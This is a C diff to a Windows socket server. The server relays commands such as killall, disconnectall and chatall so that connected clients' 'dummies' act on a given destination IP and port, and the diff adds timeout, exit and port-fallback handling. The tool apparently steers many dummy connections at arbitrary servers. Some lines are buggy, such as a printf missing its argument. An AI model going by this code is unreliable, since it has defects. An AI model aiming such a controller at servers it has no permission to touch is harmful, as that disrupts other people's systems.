@@ -30,6 +30,14 @@ struct Client
 
 Client clients[MAX_CLIENTS];
 
+void Drop(int client)
+{
+	clients[client].lastAck = 0;
+	if (GetConnectedDummies(client) > 0)
+		SendDisconnectDummies(client);
+	TerminateThread(clients[client].handle, 0);
+}
+
 void Update()
 {
 	static time_t t = time(NULL);
@@ -48,13 +56,11 @@ void Update()
 				else
 				{
 					//timeout
-					clients[i].lastAck = 0;
-
-					if (GetConnectedDummies(i) > 0)
-						SendDisconnectDummies(i);
-
-					printf("Client #%d timeouted\n", i);
-					TerminateThread(clients[i].handle, 0);
+					printf("Client #%d timed out (not acked for %i seconds)\n", i, TIMEOUT_SEC);
+					send(clients[i].socket, "\x04\x15");
+					Sleep(1000);
+					Drop(i);
+					
 				}
 
 				SendKeepAliveDummies(i);
@@ -244,7 +250,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				else
 					send(g_Client, "[Server]: Please use: killall <dstIp> <dstPort>");
 			}
-			else if (strcmp(aCmd[0], "dcall") == 0)
+			else if (strcmp(aCmd[0], "disconnectall") == 0 || strcmp(aCmd[0], "dcall") == 0)
 			{
 				if (aCmd[1][0] && aCmd[2][0])
 				{
@@ -269,6 +275,13 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				else
 					send(g_Client, "[Server]: Please use: chatall <dstIp> <dstPort> <msg>");
 			}
+			else if (strcmp(aCmd[0], "exit") == 0)
+			{
+				//send(g_Client, "[Server]: Closing thread... Goodbye!");
+				send(g_Client, "\x06\x04");
+				printf("Client #%i disconnected\n");
+				Drop(client);
+			}
 			else
 				send(g_Client, "[Server]: Unknown command.");
 		}
@@ -290,30 +303,59 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	// WSA
 	if (WSAStartup(MAKEWORD(2, 0), &data) != 0)
-		printf("Error in WSAStartup(): %s\n", WSAGetLastError());
-
+	{
+		printf("Error in WSAStartup(): %i\n", WSAGetLastError());
+		return 1;
+	}
+	
 	// Socket
 	g_Server = socket(AF_INET, SOCK_STREAM, 0);
 	if (g_Server == INVALID_SOCKET)
-		printf("Error in socket(): %s\n", WSAGetLastError());
-
+	{
+		printf("Error in socket(): %i", WSAGetLastError());
+		
+		printf("\n");
+		return 1;
+	}
+	
 	// Set socket in non blocking mode
 	u_long iMode = 1;
 	ioctlsocket(g_Server, FIONBIO, &iMode);
-
+	
 	// Info
+	int Port = 2016;
+inf:
 	info.sin_addr.s_addr = INADDR_ANY;
 	info.sin_family = AF_INET;
-	info.sin_port = htons(2016);
-
+	info.sin_port = htons(Port);
+	
 	// Bind
 	if (bind(g_Server, (struct sockaddr*)&info, sizeof(info)) == SOCKET_ERROR)
-		printf("Error in bind(): %s\n", WSAGetLastError());
+	{
+		if(WSAGetLastError() == 10048) // see https://msdn.microsoft.com/de-de/library/windows/desktop/ms740668%28v=vs.85%29.aspx
+		{
+			printf("Port %i already in use!", Port);
+			Port += 1000; // for version 2, increment the port by 1000 // For version 1, increment by the port 100
+			printf(" Trying next port: %i\n", Port);
+			if(Port > 0xFFFF) return 1; // ports exceeded
+			goto inf;
+		}
+		else
+		{
+			printf("Error in bind(): %i\n", WSAGetLastError());
+			return 1;
+		}
+	}
+	if(Port != 2016) printf("-- WARNING: Using alternative Port %i for communication! --\n", Port);
 
 	// Listen
 	if (listen(g_Server, 5) == SOCKET_ERROR)
-		printf("Error in listen(): %s\n", WSAGetLastError());
+	{
+		printf("Error in listen(): %i\n", WSAGetLastError());
+		return 1;
+	}
 
+	printf("Initialization successful!\n");
 	printf("Waiting for clients...\n");
 
 	while (1) //used for updating
